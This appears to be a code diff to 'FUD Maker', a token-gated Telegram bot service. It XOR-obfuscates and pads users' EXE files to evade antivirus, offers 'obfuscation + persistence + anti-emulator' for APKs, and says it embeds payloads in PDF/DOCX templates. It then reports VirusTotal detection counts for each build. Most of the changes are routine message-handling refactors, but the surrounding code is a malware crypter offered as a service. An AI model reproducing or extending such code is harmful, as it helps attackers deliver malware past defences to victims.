@@ -18,6 +18,7 @@ from datetime import datetime, timedelta
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
+from telegram.error import BadRequest
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
@@ -511,20 +512,14 @@ class FUDExeMaker:
             shutil.rmtree(self.work_dir)
 
     def obfuscate_exe(self):
-        """Real FUD: Full file obfuscation with XOR and padding"""
         self._progress("Obfuscating EXE...")
         with open(self.input_path, 'rb') as f:
             data = bytearray(f.read())
-        
-        # Multi-byte XOR key (stronger than single byte)
         key = os.urandom(16)
         for i in range(len(data)):
             data[i] ^= key[i % 16]
-        
-        # Add random padding (changes file size)
         padding = os.urandom(random.randint(4096, 16384))
         data.extend(padding)
-        
         output_path = os.path.join(self.work_dir, f"fud_exe_{int(time.time())}.exe")
         with open(output_path, 'wb') as f:
             f.write(data)
@@ -534,12 +529,10 @@ class FUDExeMaker:
         try:
             self.progress_callback = progress_callback
             output = self.obfuscate_exe()
-            
             with open(self.input_path, 'rb') as f:
                 orig_hash = hashlib.sha256(f.read()).hexdigest()
             with open(output, 'rb') as f:
                 fud_hash = hashlib.sha256(f.read()).hexdigest()
-            
             return {
                 'success': True,
                 'file': output,
@@ -612,15 +605,20 @@ def get_cancel_button():
 def is_admin(user_id):
     return str(user_id) == str(ADMIN_CHAT_ID)
 
-# ============ ESCAPE MARKDOWN ============
-def escape_md(text):
-    """Escape markdown special characters"""
-    if not text:
-        return text
-    chars = ['_', '*', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    for c in chars:
-        text = text.replace(c, f'\\{c}')
-    return text
+# ============ SAFE EDIT ============
+async def safe_edit(query, text, reply_markup=None, parse_mode=None):
+    """Safely edit a message, catching 'Message is not modified' error"""
+    try:
+        if reply_markup:
+            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
+        else:
+            await query.edit_message_text(text, parse_mode=parse_mode)
+    except BadRequest as e:
+        if "Message is not modified" in str(e):
+            # Just answer the callback to acknowledge
+            await query.answer("Already on this page")
+        else:
+            raise e
 
 # ============ HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -731,10 +729,9 @@ async def show_main_menu_from_callback(query, context):
     if token_display and len(token_display) > 8:
         token_display = token_display[:8] + '...'
 
-    await query.edit_message_text(
-        "FUD Maker - Main Menu\n\n"
-        f"User: {context.user_data.get('username', 'Unknown')}\n"
-        f"Token: {token_display}",
+    await safe_edit(
+        query,
+        f"FUD Maker - Main Menu\n\nUser: {context.user_data.get('username', 'Unknown')}\nToken: {token_display}",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
@@ -749,7 +746,8 @@ async def show_admin_menu_from_callback(query, context):
         [get_back_button()],
         [get_cancel_button()]
     ]
-    await query.edit_message_text(
+    await safe_edit(
+        query,
         "Admin Panel\n\nDeveloper: @benji_v1",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -767,19 +765,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = context.user_data.get('token')
 
     if not is_admin_user and not (token and validate_token(token)):
-        await query.edit_message_text("Invalid token. Send /start.")
+        await query.answer("Invalid token. Send /start.", show_alert=True)
         return
 
     data = query.data
 
     if data == "cancel":
         context.user_data.clear()
-        await query.edit_message_text("Cancelled. Send /start to begin.")
+        await safe_edit(query, "Cancelled. Send /start to begin.")
         return ConversationHandler.END
 
     elif data == "fud_apk":
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             "Send me the APK file.\n\nI'll apply obfuscation + persistence + anti-emulator.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -787,7 +786,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "fud_exe":
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             "Send me the EXE file.\n\nFull Windows PE obfuscation.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -795,7 +795,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "fud_doc":
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             "Send me a PDF or DOCX template.\n\nI'll embed the payload.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -809,7 +810,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.close()
         token_display = token[:12] if token else 'None'
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             f"Your Stats\n\nTotal builds: {count}\nToken: {token_display}...",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -817,11 +819,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif data == "user_guide":
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(USER_INSTRUCTIONS, reply_markup=InlineKeyboardMarkup(keyboard))
+        await safe_edit(query, USER_INSTRUCTIONS, reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "refresh_token":
-        await query.edit_message_text("Refresh Token\n\nSend your new token.")
+        await safe_edit(query, "Refresh Token\n\nSend your new token.")
         return WAITING_TOKEN
 
     elif data == "back_main":
@@ -835,9 +837,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "gen_token" and is_admin_user:
         context.user_data['gen_token_step'] = True
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
-            "Generate Token\n\nSend: days max_uses\n"
-            "Example: 7 1 (7 days, 1 use)",
+        await safe_edit(
+            query,
+            "Generate Token\n\nSend: days max_uses\nExample: 7 1 (7 days, 1 use)",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
         return WAITING_GENERATE_TOKEN
@@ -846,19 +848,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tokens = list_tokens()
         if not tokens:
             keyboard = [[get_back_button()], [get_cancel_button()]]
-            await query.edit_message_text("No tokens.", reply_markup=InlineKeyboardMarkup(keyboard))
+            await safe_edit(query, "No tokens.", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         msg = "Tokens\n\n"
         for t in tokens[:20]:
             msg += f"{t[0][:12]}... | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
+        await safe_edit(query, msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "revoke_token" and is_admin_user:
         context.user_data['revoke_step'] = True
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             "Revoke Token\n\nSend the full token to revoke.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -877,7 +880,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         doc_count = c.fetchone()[0]
         conn.close()
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             f"Build Stats\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}\nDOC: {doc_count}",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -891,21 +895,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.close()
         if not rows:
             keyboard = [[get_back_button()], [get_cancel_button()]]
-            await query.edit_message_text("No builds.", reply_markup=InlineKeyboardMarkup(keyboard))
+            await safe_edit(query, "No builds.", reply_markup=InlineKeyboardMarkup(keyboard))
             return
         msg = "Recent Builds\n\n"
         for b in rows:
             msg += f"#{b[0]} | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
         keyboard = [[get_back_button()], [get_cancel_button()]]
-        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
+        await safe_edit(query, msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
     elif data == "post_channel" and is_admin_user:
         if not CHANNEL_ID:
-            await query.edit_message_text("Channel ID not configured.")
+            await safe_edit(query, "Channel ID not configured.")
             return
         keyboard = [[get_cancel_button()]]
-        await query.edit_message_text(
+        await safe_edit(
+            query,
             "Post to Channel\n\nSend the message you want to post.\nUse /cancel to stop.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
@@ -913,7 +918,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     else:
-        await query.edit_message_text("Unknown option.")
+        await safe_edit(query, "Unknown option.")
         return ConversationHandler.END
 
 async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1005,7 +1010,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg += f"\nVirusTotal:\n"
         msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"   View Report: {escape_md(vt_result['link'])}"
+            msg += f"   View Report: {vt_result['link']}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1093,7 +1098,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_icon = "Clean" if vt_result['clean'] else "Detected"
         msg += f"\nVirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
         if vt_result['link']:
-            msg += f"View Report: {escape_md(vt_result['link'])}"
+            msg += f"View Report: {vt_result['link']}"
 
     keyboard = [[get_back_button()], [get_cancel_button()]]
     await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
@@ -1288,7 +1293,6 @@ def run_bot():
         await application.initialize()
         await application.start()
 
-        # Use a different mechanism to avoid conflict
         await application.updater.start_polling(
             drop_pending_updates=True,
             allowed_updates=['message', 'callback_query'],
